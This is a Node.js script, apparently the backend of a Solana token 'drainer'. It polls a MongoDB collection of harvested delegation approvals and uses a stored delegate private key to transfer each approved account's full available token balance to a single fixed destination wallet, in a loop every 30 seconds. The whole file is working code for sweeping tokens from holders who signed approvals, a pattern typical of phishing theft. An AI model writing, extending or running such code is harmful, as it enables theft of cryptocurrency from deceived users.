require('dotenv').config({ path: require('path').resolve(__dirname, '.env') });

const { MongoClient } = require('mongodb');
const { Connection, Keypair, PublicKey, Transaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const {
  getAccount, getMint, createTransferCheckedWithTransferHookInstruction, getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
} = require('@solana/spl-token');
const { loadSolanaConfig, assertConfiguredDestination } = require('./solanaApprovals');

const MONGO_URI = process.env.MONGODB_URI;
if (!MONGO_URI) throw new Error('Missing required environment variable: MONGODB_URI');

function getKeypairFromPrivateKey(value) {
  if (!value) throw new Error('Missing delegate private key');
  const cleaned = value.trim().replace(/^['"]|['"]$/g, '');
  for (const decode of [
    () => bs58.decode(cleaned),
    () => Buffer.from(cleaned, 'base64'),
    () => Uint8Array.from(JSON.parse(cleaned)),
  ]) {
    try {
      const bytes = decode();
      if (bytes.length === 64) return Keypair.fromSecretKey(Uint8Array.from(bytes));
    } catch (_) { /* try next encoding */ }
  }
  throw new Error('Invalid delegate private key encoding');
}

async function claimApproval(collection, id) {
  return collection.findOneAndUpdate(
    { _id: id, verified: true, executed: { $ne: true }, transferred: { $ne: true }, processing: { $ne: true } },
    { $set: { processing: true, processingAt: new Date() } },
    { returnDocument: 'after' }
  );
}

async function transferApproval(collection, job, config, delegateKeypair) {
  assertConfiguredDestination(job.destinationAddress, config);
  if (job.network !== config.network) throw new Error(`Unsupported network: ${job.network}`);
  if (job.delegate !== config.delegateAddress) throw new Error('Approval delegate does not match runtime delegate');

  const connection = new Connection(config.rpcUrl, 'confirmed');
  const transaction = new Transaction();
  const transferResults = [];
  const destination = new PublicKey(config.destinationAddress);

  for (const approval of job.approvals || []) {
    try {
      const source = new PublicKey(approval.tokenAccount);
      const rawTokenAccount = await connection.getAccountInfo(source, 'confirmed');
      if (!rawTokenAccount) throw new Error('Token account not found');
      const tokenProgramId = rawTokenAccount.owner.equals(TOKEN_2022_PROGRAM_ID) ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
      if (![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(rawTokenAccount.owner.toBase58())) throw new Error('Unsupported token program');
      if (approval.programId && approval.programId !== tokenProgramId.toBase58()) throw new Error('Stored token program mismatch');
      const accountInfo = await getAccount(connection, source, 'confirmed', tokenProgramId);
      if (!accountInfo.delegate || accountInfo.delegate.toBase58() !== config.delegateAddress) throw new Error('Delegate not set');
      const amount = accountInfo.delegatedAmount < accountInfo.amount ? accountInfo.delegatedAmount : accountInfo.amount;
      if (amount === 0n) throw new Error('No balance available');

      const mint = new PublicKey(approval.mint);
      if (accountInfo.mint.toBase58() !== mint.toBase58()) throw new Error('Source mint mismatch');
      const mintInfo = await getMint(connection, mint, 'confirmed', tokenProgramId);
      const destinationAta = await getAssociatedTokenAddress(mint, destination, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
      let exists = true;
      try { await getAccount(connection, destinationAta, 'confirmed', tokenProgramId); } catch (_) { exists = false; }
      if (!exists) transaction.add(createAssociatedTokenAccountInstruction(
        delegateKeypair.publicKey, destinationAta, destination, mint, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID
      ));

      transaction.add(await createTransferCheckedWithTransferHookInstruction(
        connection, source, mint, destinationAta, delegateKeypair.publicKey,
        amount, mintInfo.decimals, [], 'confirmed', tokenProgramId
      ));
      transferResults.push({ tokenAccount: approval.tokenAccount, mint: approval.mint, programId: tokenProgramId.toBase58(), amount: amount.toString(), destinationAta: destinationAta.toBase58(), success: true });
    } catch (error) {
      transferResults.push({ tokenAccount: approval.tokenAccount, success: false, reason: error.message });
    }
  }

  if (!transaction.instructions.length) throw new Error('No valid transfers');
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = delegateKeypair.publicKey;
  transaction.sign(delegateKeypair);
  const signature = await connection.sendRawTransaction(transaction.serialize(), { skipPreflight: false, maxRetries: 3 });
  const confirmation = await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
  if (confirmation.value.err) throw new Error(`Transfer failed: ${JSON.stringify(confirmation.value.err)}`);

  await collection.updateOne(
    { _id: job._id, processing: true },
    { $set: { transferred: true, transferredAt: new Date(), transferTransactionSignature: signature, transferResults }, $unset: { processing: '', processingAt: '' } }
  );
  return signature;
}

async function transferApprovedTokens() {
  const config = loadSolanaConfig();
  const delegateKeypair = getKeypairFromPrivateKey(process.env.SOLANA_MAINNET_DELEGATE_PRIVATE_KEY);
  if (delegateKeypair.publicKey.toBase58() !== config.delegateAddress) throw new Error('Delegate private key does not match SOLANA_MAINNET_DELEGATE');
  console.log(`[SolanaTransfer] pid=${process.pid} cwd=${process.cwd()} file=${__filename} destination=${config.destinationAddress} delegate=${config.delegateAddress}`);

  const client = new MongoClient(MONGO_URI);
  try {
    await client.connect();
    const collection = client.db('permit2DB').collection('solana_approvals');
    const candidates = await collection.find({ verified: true, executed: { $ne: true }, transferred: { $ne: true }, processing: { $ne: true } }).limit(100).toArray();
    for (const candidate of candidates) {
      const job = await claimApproval(collection, candidate._id);
      if (!job) continue;
      try {
        const signature = await transferApproval(collection, job, config, delegateKeypair);
        console.log(`[SolanaTransfer] completed job=${job._id} signature=${signature}`);
      } catch (error) {
        console.error(`[SolanaTransfer] rejected job=${job._id}: ${error.message}`);
        const destinationMismatch = error.message.startsWith('Destination mismatch:');
        await collection.updateOne(
          { _id: job._id, processing: true },
          destinationMismatch
            ? {
                $set: { reason: error.message, lastErrorAt: new Date() },
                $unset: { processing: '', processingAt: '', executed: '', executedAt: '' },
              }
            : {
                $set: { executed: true, executedAt: new Date(), reason: error.message },
                $unset: { processing: '', processingAt: '' },
              }
        );
      }
    }
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  while (true) {
    try { await transferApprovedTokens(); } catch (error) { console.error(`[SolanaTransfer] cycle failed: ${error.message}`); }
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

if (require.main === module) runContinuously().catch(error => { console.error(error); process.exit(1); });
module.exports = { transferApprovedTokens, runContinuously };
